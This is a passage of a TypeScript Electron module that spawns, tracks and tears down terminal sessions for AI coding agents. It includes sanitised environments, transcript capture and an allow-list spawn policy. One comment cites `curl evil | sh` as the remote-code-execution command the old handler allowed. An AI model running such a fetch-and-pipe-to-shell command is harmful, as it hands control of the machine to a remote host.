import { app, type IpcMain, type BrowserWindow } from "electron";
import log from "electron-log/main";
import * as os from "node:os";
import * as fs from "node:fs";
import * as path from "node:path";
import { spawnSync } from "node:child_process";
import { getAppTheme } from "./app-theme";
import { getBooleanAppSetting } from "./app-settings-store";
import {
  awaitFsPermissionPreflight,
  currentFsPermissionRecords,
  isFsPermissionPreflightResolved,
} from "./fs-permission-preflight";
import { runSessionScaffolding, unreadableCwdNotice } from "./session-scaffolding";
import {
  REMOTE_TAIL_LIMIT_BYTES,
  recordPtyInput,
  recordPtyOutput,
  trackPty,
  untrackPty,
} from "./silence-tracker";
import { IPC } from "./ipc-channels";
import { safeHandle } from "./ipc-safe-handle";
import { PtyOutputBatcher } from "./pty-output-batch";
import {
  resolveAgentCommandMeetingVersion,
  resolveAgentCommandOnPath,
} from "./agent-cli-resolution";
import {
  resolveShell,
  sanitizedProcessEnv,
  shellArgsForCommand,
} from "./shell-env";
import { loadProjectRoots } from "./project-roots";
import { shortId } from "../src/shared/short-id";
import {
  resolveSpawnPlan,
  SpawnPolicyError,
  type SpawnRequest,
} from "./pty-spawn-policy";
import { buildSyntheticHookUrl, buildTaskApiUrl, type PtyHookEnv } from "./pty-hook-env";
import { AGENT_HOOK_EVENTS } from "../src/shared/agent-hook-events";
import { checkAgentCliVersionCached, agentVersionErrorMessage } from "./agent-cli-version";
import {
  AGENT_CLI_CONFIG,
  AGENT_CLI_CONFIG_BY_COMMAND,
} from "./agent-cli-version-requirements";
import { applyAgentPtyEnv } from "../src/shared/agent-pty-env";

function sanitizeEnv(): Record<string, string> {
  const out = sanitizedProcessEnv();
  // The PTY is xterm.js, not whichever terminal launched Electron. Leaking
  // TERM_PROGRAM=ghostty (or iTerm.app, etc.) makes Claude Code take terminal-
  // specific code paths that don't match what we actually emit — e.g. it skips
  // installing the Shift+Enter keybinding when it thinks Ghostty is handling it
  // natively, but xterm.js sends `\x1b\r` (the iTerm sequence) instead of LF.
  delete out.TERM_PROGRAM;
  delete out.TERM_PROGRAM_VERSION;
  delete out.MC_API_URL;
  delete out.MC_API_TOKEN;
  return out;
}

// Claude Code only treats ESC+CR (`\x1b\r`, what `terminal-keymap.ts` emits for
// Shift+Enter) as "insert newline" when this flag is set. Normally `/terminal-
// setup` writes it; do it eagerly so the user doesn't have to.
function ensureClaudeShiftEnterBinding(): void {
  try {
    const dir = path.join(os.homedir(), ".claude");
    const file = path.join(dir, "settings.json");
    let settings: Record<string, unknown> = {};
    if (fs.existsSync(file)) {
      const raw = fs.readFileSync(file, "utf8");
      if (raw.trim()) settings = JSON.parse(raw);
    }
    if (settings.shiftEnterKeyBindingInstalled === true) return;
    settings.shiftEnterKeyBindingInstalled = true;
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(file, JSON.stringify(settings, null, 2) + "\n", "utf8");
  } catch {
    // best-effort — user can still run `/terminal-setup` manually.
  }
}

type Pty = {
  id: string;
  taskId: string;
  proc: any;
  buffer: PtyBufferChunk[];
  bufferBytes: number;
  nextSeq: number;
  cwd: string;
  command: string;
  agent?: string;
  /** True for user-shell terminals; findByTask only matches agent PTYs. */
  shell: boolean;
  mcEnv?: PtyHookEnv;
  scanTail: string;
  lastInterruptAt: number;
  /** Last renderer write (user keystroke) — marks the PTY as interactive so
   *  battery saver never throttles typing echo (see pty-output-batch.ts). */
  lastInputAt: number;
};

type PtyBufferChunk = {
  seq: number;
  data: string;
  bytes: number;
};

const INTERRUPT_COOLDOWN_MS = 2000;
const SCAN_TAIL_MAX = 256;
/** How long after a keystroke a PTY still counts as interactive. */
const PTY_INTERACTIVE_WINDOW_MS = 10_000;

// How long we wait for SIGTERM to take before giving up the wait on a pty kill.
const SIGTERM_GRACE_MS = 1_500;
const PTY_EXIT_POLL_INTERVAL_MS = 50;
const TASKKILL_TIMEOUT_MS = 5_000;
const LOG_VALUE_MAX_LENGTH = 160;

function safeLogValue(value: unknown): unknown {
  if (typeof value !== "string") return value;
  const cleaned = value.replace(/[\x00-\x1f\x7f]/g, "?");
  return cleaned.length > LOG_VALUE_MAX_LENGTH
    ? `${cleaned.slice(0, LOG_VALUE_MAX_LENGTH)}...`
    : cleaned;
}
const DEFAULT_PTY_COLS = 100;
const DEFAULT_PTY_ROWS = 30;

export function hasClaudeInterruptPrompt(text: string): boolean {
  return (
    text.includes("Interrupted by user") ||
    (text.includes("Interrupted") &&
      text.includes("What should Claude do instead"))
  );
}

export function hasCodexHookReviewPrompt(text: string): boolean {
  const normalized = text.replace(/\s+/g, " ").toLowerCase();
  return (
    normalized.includes("hooks need review before they can run") ||
    normalized.includes("open /hooks to review")
  );
}

function scanTail(p: Pty, chunk: string): string {
  const haystack = (p.scanTail + chunk).slice(-SCAN_TAIL_MAX - chunk.length);
  p.scanTail = haystack.slice(-SCAN_TAIL_MAX);
  return haystack;
}

function scanForInterrupt(p: Pty, haystack: string) {
  if (p.agent !== "claude-code") return;
  if (!p.mcEnv?.apiUrl || !p.mcEnv?.token) return;
  if (!hasClaudeInterruptPrompt(haystack)) return;
  const now = Date.now();
  if (now - p.lastInterruptAt < INTERRUPT_COOLDOWN_MS) return;
  p.lastInterruptAt = now;
  void postSyntheticHook(p, "UserInterrupt");
}

function scanForCodexHookReview(p: Pty, haystack: string) {
  if (p.agent !== "codex") return;
  if (!p.mcEnv?.apiUrl || !p.mcEnv?.token) return;
  if (!hasCodexHookReviewPrompt(haystack)) return;
  void postSyntheticHook(p, "PermissionRequest");
}

async function postSyntheticHook(p: Pty, event: string, extra?: Record<string, unknown>) {
  try {
    const url = buildSyntheticHookUrl(p.mcEnv!, p.agent, p.taskId);
    if (!url) return;
    await fetch(url, {
      method: "POST",
      headers: {
        "content-type": "application/json",
        authorization: `Bearer ${p.mcEnv!.token}`,
      },
      body: JSON.stringify({ hook_event_name: event, ...extra }),
    });
  } catch {
    /* swallow — best-effort status sync */
  }
}

/**
 * Transcript capture (R23, R25).
 *
 * The bytes have to cross a process boundary whoever writes them: Electron main
 * has no database access, because the server runs as a child process. This
 * rides the output batcher's already-coalesced flush cadence rather than the
 * per-chunk data handler, so the hot path stays allocation-cheap and no new
 * timer is introduced.
 *
 * Deliberately fire-and-forget. A dropped chunk under load is a better trade
 * than a write that can stall a terminal, which R25 forbids outright — so
 * nothing here is awaited on the flush path, and every failure is swallowed.
 * The pending set exists only so a clean quit can wait for outstanding writes
 * (KTD9); it is not a retry queue.
 */
const pendingTranscriptWrites = new Set<Promise<void>>();

/**
 * Ceiling on in-flight transcript writes.
 *
 * Without one, a server child that accepts connections and stops answering
 * makes this set grow on the batcher's cadence, each entry holding its
 * serialized body -- turning a stalled peer into main-process memory growth.
 * Dropping past the ceiling is what the fire-and-forget contract above already
 * promises: a dropped chunk beats a write that costs the terminal anything.
 *
 * Sized at roughly a second of flushes for several concurrent sessions, so it
 * is only reached when writes genuinely are not draining.
 */
const MAX_PENDING_TRANSCRIPT_WRITES = 64;

/**
 * The live batcher, so the quit drain can force a final flush.
 *
 * registerPtyHandlers() is called once per app run, so this is a handle to that
 * one instance rather than a registry.
 */
let activeOutputBatcher: PtyOutputBatcher | null = null;

/**
 * Where a flushed batch should be sent, or `null` to drop it.
 *
 * Exported for its own sake: every branch here is a silent drop, so the ones
 * that are correct need to be distinguishable from the ones that would be bugs.
 */
export function transcriptCaptureTarget(
  pty: { shell: boolean; taskId: string },
  mcEnv: PtyHookEnv | null | undefined,
  data: string,
): { url: string; token: string } | null {
  // Agent sessions only (KTD10). A shell or dashboard terminal's id belongs to
  // a separate entity, and the retention table's key is an enforced foreign key
  // to the task table — so an insert for one would be rejected rather than
  // stored. Dropping it here keeps a guaranteed-failing request off the wire.
  if (pty.shell) return null;
  if (!data) return null;
  if (!mcEnv?.apiUrl || !mcEnv.token) return null;
  const url = buildTaskApiUrl(mcEnv, pty.taskId, "terminal-output");
  if (!url) return null;
  return { url, token: mcEnv.token };
}

function captureTranscriptBatch(p: Pty, mcEnv: PtyHookEnv | null, data: string): void {
  const target = transcriptCaptureTarget(p, mcEnv, data);
  if (!target) return;
  // Writes are not draining; drop rather than accumulate. Retention is
  // best-effort by decision, and the alternative is unbounded growth in main.
  if (pendingTranscriptWrites.size >= MAX_PENDING_TRANSCRIPT_WRITES) return;

  const write = fetch(target.url, {
    method: "POST",
    headers: {
      "content-type": "application/json",
      authorization: `Bearer ${target.token}`,
    },
    body: JSON.stringify({ chunks: [data] }),
  })
    .then(() => {})
    .catch(() => {
      /* swallow — best-effort retention, never the terminal's problem */
    })
    .finally(() => {
      pendingTranscriptWrites.delete(write);
    });
  pendingTranscriptWrites.add(write);
}

/**
 * Wait for outstanding transcript writes, up to `timeoutMs` (KTD9).
 *
 * The bound is not optional. These writes carry no acknowledgment, so an
 * unresponsive or already-dead server child must not be able to hang the quit —
 * an app that will not exit and says nothing is the symptom this work exists to
 * remove, and reintroducing it at shutdown for a few final lines would be a
 * poor trade.
 */
/**
 * Flush pending PTY output and wait for the transcript writes it produces.
 *
 * Called at quit, before the server child is killed (KTD9). Without it every
 * clean quit loses the closing output of every live session: the quit handler
 * tears down each PTY and kills the server a few synchronous lines later, while
 * each PTY's final flush runs in its asynchronous exit handler — so the server
 * dies before the last batches arrive.
 *
 * Bounded, because the writes it waits on carry no acknowledgment.
 */
export async function drainPtyTranscripts(timeoutMs: number): Promise<void> {
  try {
    activeOutputBatcher?.flushAll();
  } catch {
    /* a failed flush must not stop the quit */
  }
  await awaitTranscriptWrites(timeoutMs);
}

/**
 * Wait for every promise, or give up at `timeoutMs` -- whichever comes first.
 *
 * Exported because the deadline is the load-bearing half: these writes carry no
 * acknowledgment, so a dead server child must not be able to hold the quit
 * open. A bound that silently stopped working would reintroduce exactly the
 * hang this work exists to remove, and nothing else would notice.
 */
export async function awaitAllSettledWithin(
  promises: Iterable<Promise<unknown>>,
  timeoutMs: number,
): Promise<void> {
  const pending = [...promises];
  if (pending.length === 0) return;
  let timer: ReturnType<typeof setTimeout> | undefined;
  const deadline = new Promise<void>((resolve) => {
    timer = setTimeout(resolve, timeoutMs);
  });
  try {
    await Promise.race([Promise.allSettled(pending).then(() => {}), deadline]);
  } finally {
    if (timer) clearTimeout(timer);
  }
}

async function awaitTranscriptWrites(timeoutMs: number): Promise<void> {
  await awaitAllSettledWithin(pendingTranscriptWrites, timeoutMs);
}

const ptys = new Map<string, Pty>();
const RING_LIMIT_BYTES = 1_000_000;

let nodePty: typeof import("node-pty") | null = null;
function loadNodePty() {
  if (!nodePty) {
    // eslint-disable-next-line @typescript-eslint/no-require-imports
    nodePty = require("node-pty");
  }
  return nodePty!;
}

/**
 * The most recent bytes of a PTY's ring.
 *
 * Walks back from the newest chunk rather than joining the whole buffer: the
 * local ring is a megabyte because it also serves replay, while a tail needs a
 * few kilobytes, and building the megabyte to throw away all but the end of it
 * would be real work on the path where an alert is already late.
 */
function readBufferTail(p: Pty, limitBytes: number = REMOTE_TAIL_LIMIT_BYTES): string {
  const parts: string[] = [];
  let bytes = 0;
  for (let i = p.buffer.length - 1; i >= 0 && bytes < limitBytes; i -= 1) {
    const chunk = p.buffer[i];
    parts.push(chunk.data);
    bytes += chunk.bytes;
  }
  return parts.reverse().join("");
}

function appendBuffer(p: Pty, data: string): number {
  const bytes = Buffer.byteLength(data, "utf8");
  const seq = p.nextSeq++;
  p.buffer.push({ seq, data, bytes });
  p.bufferBytes += bytes;
  while (p.bufferBytes > RING_LIMIT_BYTES && p.buffer.length > 1) {
    const dropped = p.buffer.shift()!;
    p.bufferBytes -= dropped.bytes;
  }
  return seq;
}

// A voice-seeded starting prompt is written to the agent's stdin like the user
// typing. Drop C0/DEL control bytes so a mis-transcription can't drive TUI
// keybindings; the submit CR is added separately by the caller.
function sanitizeInitialInput(text: string | undefined): string | undefined {
  if (!text) return undefined;
  const clean = Array.from(text)
    .filter((ch) => {
      const code = ch.charCodeAt(0);
      return code >= 32 && code !== 127;
    })
    .join("")
    .trim();
  return clean || undefined;
}

function send(getWin: () => BrowserWindow | null, channel: string, payload: any) {
  const win = getWin();
  if (!win || win.isDestroyed()) return;
  win.webContents.send(channel, payload);
}

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

/**
 * True when `cwd` is `root` or a path nested inside it. Used to find every PTY
 * whose working directory lives under a worktree that's about to be deleted.
 * Case-insensitive on Windows because a PTY's resolved cwd and the worktree
 * path the renderer sends can differ in drive-letter / segment casing.
 */
export function isCwdWithin(cwd: string, root: string): boolean {
  if (!cwd || !root) return false;
  const norm = (p: string) => {
    const resolved = path.resolve(p);
    return os.platform() === "win32" ? resolved.toLowerCase() : resolved;
  };
  const rel = path.relative(norm(root), norm(cwd));
  return rel === "" || (!rel.startsWith("..") && !path.isAbsolute(rel));
}

/**
 * node-pty's `proc.kill()` only signals the immediate shell. On Windows that
 * leaves grandchild processes alive — notably the `node.exe` running Claude
 * Code, which keeps a handle on the worktree's `.claude/` dir and blocks the
 * delete with "Permission denied". taskkill /T tears down the whole tree so the
 * handles are released before we try to remove the worktree.
 */
function killProcessTreeWindows(pid: number | undefined): void {
  if (os.platform() !== "win32" || !pid || pid <= 0) return;
  try {
    spawnSync("taskkill", ["/pid", String(pid), "/t", "/f"], {
      timeout: TASKKILL_TIMEOUT_MS,
    });
  } catch {
    /* best-effort — proc.kill() below is the fallback */
  }
}

/**
 * Fully release a PTY, including the master /dev/ptmx fd that node-pty holds in
 * THIS (main Electron) process.
 *
 * node-pty's `proc.kill()` only sends SIGHUP to the immediate child — it never
 * closes the master fd. If that child survives the signal (a claude/codex agent
 * that re-parented its tool subprocesses, a shell trapping SIGHUP, a stopped
 * job), the slave stays open, the master never sees EIO, and node-pty keeps the
 * master fd open for the life of the app. Every leaked master counts against
 * macOS's system-wide `kern.tty.ptmx_max` (~511), so a long-lived window that
 * churns PTYs (e.g. the warm-session pool re-preparing on every project query
 * refetch) eventually exhausts the cap and makes EVERY pty spawn on the whole
 * machine fail with posix_spawnp/ENXIO.
 *
 * node-pty's `destroy()` is the only method that closes the master socket
 * directly; hanging up the master also makes the kernel SIGHUP the slave's
 * foreground process group, so the fd is reclaimed even when the child won't die
 * on its own. It isn't on the public `IPty` type but exists on both the Unix and
 * Windows terminals at runtime — fall back to `kill()` if a future version drops
 * it. This is the single teardown path; never call `proc.kill()` directly.
 *
 * NOTE: destroy() alone did not stop ptmx exhaustion. node-pty <= 1.1.0 ALSO
 * leaked two fds inside every macOS spawn (a never-closed posix_openpt guard
 * fd and the parent's copy of the slave fd), plus the master on failed spawns
 * — so churn (warm pools) still crept toward the cap, and once near it every
 * failed retry leaked 2-3 more fds until the whole machine couldn't allocate
 * PTYs. Fixed by node-pty 1.2.0-beta.14 (closes slave + guard fds on all
 * paths, master on error). Don't downgrade node-pty below that.
 */
export function disposePty(
  proc: import("node-pty").IPty | null | undefined,
  // `silent` suppresses this teardown's own begin/end pair. killAllPtys()
  // brackets the whole sweep instead: it is an unbatched loop over every live
  // PTY, and each log call is a synchronous open-write-close, so instrumenting
  // inside it turns closing a busy project into a burst of file writes in one
  // event-loop turn. The bulk pair still carries the count, so a log that stops
  // mid-sweep shows how far it got.
  opts: { silent?: boolean } = {},
): void {
  if (!proc) return;
  // Capture the pid before destroy() so the tree-kill below still has it.
  const pid = proc.pid;
  // Close the pseudoconsole FIRST. node-pty's Windows destroy() runs the ConPTY
  // teardown (ClosePseudoConsole + a final conout-worker dispose) that lets the
  // kernel reap the conhost.exe ConPTY spawned. A pre-destroy `taskkill /F`
  // (the old order) killed the shell out from under that teardown, so the
  // dispose never fired and one conhost.exe (~8.5 MB, parented to our main
  // process) leaked on every create→delete of a terminal.
  const closable = proc as unknown as { destroy?: () => void };
  // Bracket the teardown. node-pty can abort() the whole process from inside
  // its ThreadSafeFunction callback here (a C++ throw that no JS catch can
  // reach), so a "pty.dispose.begin" with no matching "end" in the log is the
  // signature of that crash — and names the pid it died on.
  if (!opts.silent) log.info("pty.dispose.begin", { event: "pty.dispose.begin", pid });
  try {
    if (typeof closable.destroy === "function") {
      closable.destroy();
    } else {
      proc.kill();
    }
  } catch {
    /* already exited or fd already closed */
  }
  if (!opts.silent) log.info("pty.dispose.end", { event: "pty.dispose.end", pid });
  // Then, on Windows only (no-op elsewhere), tree-kill any survivors: SIGHUP /
  // console-close doesn't reliably reach a grandchild node.exe that re-parented
  // its tool subprocesses and holds the worktree's .claude/ handle. This runs
  // back-to-back with destroy(), so the shell tree is still intact here.
  killProcessTreeWindows(pid);
}

async function killPty(p: Pty): Promise<boolean> {
  let exited = false;
  try {
    const sub = p.proc.onExit(() => {
      exited = true;
    });
    disposePty(p.proc);
    const deadline = Date.now() + SIGTERM_GRACE_MS;
    while (!exited && Date.now() < deadline) {
      await sleep(PTY_EXIT_POLL_INTERVAL_MS);
    }
    sub?.dispose?.();
    return true;
  } catch {
    return false;
  } finally {
    ptys.delete(p.id);
    untrackPty(p.id);
  }
}

/**
 * Kill every live PTY whose working directory is inside `root`, awaiting their
 * exit. Called before a worktree is deleted so no terminal, agent, or launch
 * process keeps a handle that would block removal on Windows. Returns how many
 * PTYs were terminated.
 */
async function killPtysUnderPath(root: string): Promise<number> {
  cancelPendingSpawnsUnderPath(root);
  const targets = [...ptys.values()].filter((p) => isCwdWithin(p.cwd, root));
  await Promise.all(targets.map((p) => killPty(p)));
  return targets.length;
}

/**
 * Spawns parked on the permission pre-flight gate.
 *
 * A spawn that resumes after its pane is gone — or after the quit handler has
 * torn every PTY down — creates a process nothing will ever kill. The gate is
 * the only place in spawn that can wait for tens of seconds, so it is the only
 * place that needs this.
 */
type PendingSpawn = { cwd: string; cancelled: boolean };
const pendingGateWaits = new Map<string, PendingSpawn>();

export function cancelPendingSpawn(taskId: string): boolean {
  const pending = pendingGateWaits.get(taskId);
  if (!pending) return false;
  pending.cancelled = true;
  return true;
}

export function cancelPendingSpawnsUnderPath(root: string): void {
  for (const [taskId, pending] of pendingGateWaits) {
    if (isCwdWithin(pending.cwd, root)) cancelPendingSpawn(taskId);
  }
}

function cancelAllPendingSpawns(): void {
  for (const pending of pendingGateWaits.values()) pending.cancelled = true;
}

/** Test-only: drop waits a deliberately-stalled gate is still holding. */
export function __resetPendingSpawnsForTests(): void {
  pendingGateWaits.clear();
}

function appIsQuitting(): boolean {
  return Boolean((app as unknown as { isQuiting?: boolean } | undefined)?.isQuiting);
}

/**
 * Wait for the launch permission sweep before scaffolding a local agent
 * session, so the consent prompts are answered against a window rather than
 * mid-session. Returns false when the spawn should be abandoned instead.
 */
export async function awaitSpawnGate(
  taskId: string,
  cwd: string,
  isQuitting: () => boolean = appIsQuitting,
): Promise<boolean> {
  if (isFsPermissionPreflightResolved()) return true;
  const pending: PendingSpawn = { cwd, cancelled: false };
  pendingGateWaits.set(taskId, pending);
  try {
    await awaitFsPermissionPreflight();
  } finally {
    pendingGateWaits.delete(taskId);
  }
  if (pending.cancelled) return false;
  // The quit handler tears down every PTY it can see; one created after it ran
  // is invisible to it.
  return !isQuitting();
}

export function registerPtyHandlers(
  ipcMain: IpcMain,
  getWin: () => BrowserWindow | null,
  getHookEnv: () => PtyHookEnv | null,
) {
  ensureClaudeShiftEnterBinding();
  // The interrupt/hook scans run on the coalesced batch: the rolling scan tail
  // sees the same byte stream it did per-chunk, detection latency is at most
  // one flush interval.
  const outputBatcher = new PtyOutputBatcher((ptyId, data, seq) => {
    const p = ptys.get(ptyId);
    if (p) {
      const haystack = scanTail(p, data);
      scanForInterrupt(p, haystack);
      scanForCodexHookReview(p, haystack);
    }
    send(getWin, IPC.ptyData, { ptyId, data, seq });
    // Retention rides this flush (R23), and lands after the renderer send so
    // the terminal is never waiting behind a write — R25.
    //
    // Credentials come from getHookEnv(), the accessor already in scope here,
    // NOT from p.mcEnv: that field is populated only for agent-mode PTYs, so
    // reading it would silently skip every session spawned without them — a
    // gap that fails without erroring.
    if (p) captureTranscriptBatch(p, getHookEnv(), data);
  });
  activeOutputBatcher = outputBatcher;
  safeHandle(
    IPC.ptySpawn,
    async (_evt, opts: SpawnRequest) => {
      const pty = loadNodePty();
      const platform = os.platform();

      // Validate cwd, agent allow-list, and command shape BEFORE spawning. The
      // pre-fix handler joined `command + args` into a shell string and handed
      // it to `sh -l -c`, which made `pty:spawn` a direct RCE primitive — a
      // briefly-compromised renderer could pass `curl evil | sh` as `command`
      // and get full local execution. The policy module rejects anything that
      // isn't an allow-listed agent binary spawned with a clean argv array, or
      // an explicitly opted-in user-shell terminal confined to a project root.
      // Project-less "home" shell terminals (dashboard terminals) resolve to the
      // host's home dir HERE — the renderer never supplies it — and the policy is
      // told to allow that dir for shell spawns only (see homeShellRoots).
      const spawnReq: SpawnRequest =
        opts.shell === true && opts.home
          ? ({ ...opts, cwd: os.homedir() } as SpawnRequest)
          : opts;
      let plan: ReturnType<typeof resolveSpawnPlan>;
      try {
        plan = resolveSpawnPlan(spawnReq, {
          projectRoots: loadProjectRoots,
          homeShellRoots: () => [os.homedir()],
          resolveCommand: (name) => {
            const env = sanitizedProcessEnv();
            const requirement = AGENT_CLI_CONFIG_BY_COMMAND[name];
            if (requirement) {
              return resolveAgentCommandMeetingVersion(name, requirement, env, platform)?.binary ?? null;
            }
            return resolveAgentCommandOnPath(name, env, platform);
          },
          resolveShell: () => ({
            shell: resolveShell(),
            shellArgs: (cmd) => shellArgsForCommand(resolveShell(), cmd, platform),
          }),
        });
      } catch (err) {
        if (err instanceof SpawnPolicyError) {
          // User-reportable failures end up as a single line in `term.writeln`
          // on the renderer; a main-side log keeps the rejection code, the
          // requesting agent, and the cwd available when a user files a "spawn
          // failed" report, without echoing the agent's argv (which may carry
          // session ids the user wouldn't want in a paste).
          log.warn("pty.spawn.rejected", {
            code: err.code,
            agent: safeLogValue(opts.agent ?? null),
            shell: opts.shell === true,
            cwd: safeLogValue(opts.cwd),
            taskId: safeLogValue(opts.taskId),
          });
          throw new Error(`pty:spawn rejected (${err.code})`);
        }
        throw err;
      }

      const env = sanitizeEnv();
      if (plan.mode === "agent") {
        const requirement = AGENT_CLI_CONFIG[plan.agent];
        const versionCheck = checkAgentCliVersionCached(plan.binary, env, requirement, platform);
        if (!versionCheck.ok) {
          const message = agentVersionErrorMessage(versionCheck);
          throw new Error(message);
        }
      }

      // Use the canonical cwd from the plan, not the original request, so a
      // symlink-swap race between validation and spawn can't move us into a
      // post-validation target outside the project root.
      // Install the pet's mid-run tool hook only while the pet is enabled.
      // Read synchronously from the same app_settings DB the server owns; when
      // off, the hook is omitted (and any previously-installed one is stripped
      // by the rebuild inside installAgentHooks). Default true = pet-on default.
      // Local agent sessions wait for the launch permission sweep so a consent
      // prompt is raised against the window rather than mid-session (R19). The
      // gate carries its own deadline, so this is bounded whether or not the
      // operator answers. Remote spawns are handled in sandbox-manager and
      // deliberately do not wait — their scaffolding happens on another machine
      // and touches no local protected path (R27). Do not "fix" that asymmetry.
      if (plan.mode === "agent" && !(await awaitSpawnGate(opts.taskId, plan.cwd))) {
        throw new Error("pty:spawn cancelled while waiting on filesystem permissions");
      }

      const petEnabled = getBooleanAppSetting(app.getPath("userData"), "pet_enabled", true);
      const mcEnv = plan.mode === "agent" ? getHookEnv() : null;
      // Every read and write under the session's working directory happens
      // here, behind one probe of that directory. A cwd under a protected
      // location with an unanswered consent prompt would otherwise stall each
      // of these calls in turn — synchronously freezing the whole app, or
      // asynchronously consuming the four-thread libuv pool that all of main's
      // promise-based filesystem work shares. See session-scaffolding.ts.
      const scaffolding = await runSessionScaffolding({
        appPath: app.getAppPath(),
        cwd: plan.cwd,
        agent: opts.agent,
        taskId: opts.taskId,
        mcEnv,
        petEnabled,
        isAgentSession: plan.mode === "agent",
        fsPermissionRecords: currentFsPermissionRecords(app.getPath("userData")),
      });

      // Theme hint for the agent: prefer main's authoritative app theme over
      // the renderer-supplied value — the renderer reads its OWN window's
      // data-theme, and a spawn initiated from a stale window (focus window,
      // floating pane) used to bake the old theme into the new session's env.
      const appTheme =
        getAppTheme() ?? (opts.missionControlTheme === "light" ? "light" : "dark");
      env.MC_TASK_ID = opts.taskId;
      if (mcEnv) {
        env.MC_API_URL = mcEnv.apiUrl;
        env.MC_API_TOKEN = mcEnv.token;
        env.MC_THEME = appTheme;
      }
      // Mirror Mission Control's light/dark to the agent's own UI. COLORFGBG is
      // the terminal-background hint Claude Code (and other COLORFGBG-aware TUIs)
      // read to auto-pick a theme: the trailing number is the background color
      // index — 15 (white) reads as light, 0 (black) as dark. This only takes
      // effect when the agent's own theme is set to "auto"; an explicit
      // light/dark in the agent's config wins. Overrides any COLORFGBG inherited
      // from the launching shell so the session matches the app, not the host.
      if (plan.mode === "agent") {
        env.COLORFGBG = appTheme === "light" ? "0;15" : "15;0";
      }
      applyAgentPtyEnv(env, opts.agent);

      // Agent mode uses the policy-built spawn target. POSIX/native executables
      // still launch directly; Windows npm .cmd/.bat shims go through cmd.exe
      // only after the agent argv has been allow-listed and tokenized.
      const spawnTarget = plan.mode === "agent" ? plan.spawnTarget : plan.shellPath;
      const spawnArgs = plan.mode === "agent" ? plan.spawnArgs : plan.shellArgs;

      let proc: import("node-pty").IPty;
      try {
        proc = pty.spawn(spawnTarget, spawnArgs, {
          name: "xterm-256color",
          cols: opts.cols ?? DEFAULT_PTY_COLS,
          rows: opts.rows ?? DEFAULT_PTY_ROWS,
          cwd: plan.cwd,
          env,
        });
      } catch (err: any) {
        const msg = err?.message ?? String(err);
        if (msg.includes("posix_spawnp")) {
          throw new Error(
            `posix_spawnp failed for target="${spawnTarget}" cwd="${plan.cwd}". ` +
              `Verify the binary exists and the cwd is a readable directory. ` +
              `Original: ${msg}`
          );
        }
        throw err;
      }

      const id = shortId("pty");
      const p: Pty = {
        id,
        taskId: opts.taskId,
        proc,
        buffer: [],
        bufferBytes: 0,
        nextSeq: 1,
        cwd: opts.cwd,
        command: opts.command,
        agent: opts.agent,
        shell: opts.shell === true,
        mcEnv: mcEnv ?? undefined,
        scanTail: "",
        lastInterruptAt: 0,
        lastInputAt: 0,
      };
      ptys.set(id, p);
      trackPty(id, {
        transport: "local",
        taskId: opts.taskId,
        shell: opts.shell === true,
        sandboxInternal: false,
        readTail: () => readBufferTail(p),
      });
      // The session starts either way (R20 asks for a report, not a retry), but
      // an operator staring at a terminal that never does anything deserves to
      // know the app could not read the directory it was pointed at.
      if (!scaffolding.ran) {
        const notice = unreadableCwdNotice(plan.cwd, scaffolding.reason);
        log.warn("pty.scaffolding.skipped", {
          event: "pty.scaffolding.skipped",
          ptyId: id,
          reason: scaffolding.reason,
          cwd: safeLogValue(plan.cwd),
        });
        outputBatcher.push(id, appendBuffer(p, notice), notice, false);
      }
      // `live` is the running PTY count — the number that crept toward the ptmx
      // cap during the fd-leak era, and the one worth having in the log when a
      // spawn starts failing.
      log.info("pty.spawned", {
        event: "pty.spawned",
        ptyId: id,
        pid: proc.pid,
        mode: plan.mode,
        live: ptys.size,
      });

      // Voice control can seed a fresh agent session with a starting prompt.
      // The agent's TUI isn't ready for input the instant it spawns, so we wait
      // for its first output plus a short settle before writing — otherwise the
      // text is dropped during startup. Fires exactly once; the trailing CR is
      // delayed slightly so the TUI registers the text before it submits.
      const INITIAL_INPUT_SETTLE_MS = 450;
      const INITIAL_INPUT_SUBMIT_DELAY_MS = 150;
      // Fallback so the prompt still lands if the agent TUI emits no output before
      // we'd otherwise wait on its first data chunk.
      const INITIAL_INPUT_MAX_WAIT_MS = 4000;
      // Strip control bytes so a mis-transcription can't drive TUI keybindings; the
      // single submit CR is added separately below.
      const initialInput =
        plan.mode === "agent" && !opts.shell
          ? sanitizeInitialInput(opts.initialInput)
          : undefined;
      let initialInputScheduled = false;
      let initialInputTimer: ReturnType<typeof setTimeout> | undefined;
      const scheduleInitialInput = (delayMs: number) => {
        if (initialInputScheduled) return;
        initialInputScheduled = true;
        initialInputTimer = setTimeout(sendInitialInput, delayMs);
      };
      const sendInitialInput = () => {
        if (!initialInput) return;
        try {
          proc.write(initialInput);
          setTimeout(() => {
            try {
              proc.write("\r");
            } catch {
              /* pty already exited */
            }
          }, INITIAL_INPUT_SUBMIT_DELAY_MS);
        } catch {
          /* pty already exited before the starting prompt could be written */
        }
      };

      proc.onData((data: string) => {
        const seq = appendBuffer(p, data);
        // Stamped here rather than at the batcher flush: the batcher coalesces
        // and delays -- up to a second when the window is hidden, further under
        // power saving -- so a flush-time stamp would inject phantom silence
        // that varies with window state.
        recordPtyOutput(id);
        outputBatcher.push(id, seq, data, Date.now() - p.lastInputAt < PTY_INTERACTIVE_WINDOW_MS);
        if (initialInput) scheduleInitialInput(INITIAL_INPUT_SETTLE_MS);
      });
      // Fallback so the prompt still lands even if the agent emits no output.
      const initialInputFallback = initialInput
        ? setTimeout(() => scheduleInitialInput(0), INITIAL_INPUT_MAX_WAIT_MS)
        : undefined;
      proc.onExit(({ exitCode, signal }: { exitCode: number; signal?: number }) => {
        if (initialInputTimer) clearTimeout(initialInputTimer);
        if (initialInputFallback) clearTimeout(initialInputFallback);
        // Final output must land before the exit event or it's lost.
        outputBatcher.flush(id);
        // Settle the task's status server-side no matter WHY the process died
        // (user closed the pane, scope switch, crash, kill) — the renderer's
        // own exit handler only runs while the pane is mounted, and skips
        // intentional closes entirely. The server only moves tasks still in an
        // active status, so respawn flows and settled tasks are unaffected.
        if (p.mcEnv?.apiUrl && p.mcEnv?.token) {
          void postSyntheticHook(p, AGENT_HOOK_EVENTS.sessionProcessExited, {
            exit_code: exitCode,
          });
        }
        send(getWin, IPC.ptyExit, { ptyId: id, exitCode, signal });
        ptys.delete(id);
        untrackPty(id);
        // A PTY dying is the last thing that happens before the lockups we're
        // chasing, and signal/exitCode is the part the renderer never records.
        // Logged after the delete so `live` is just the map size — killPty may
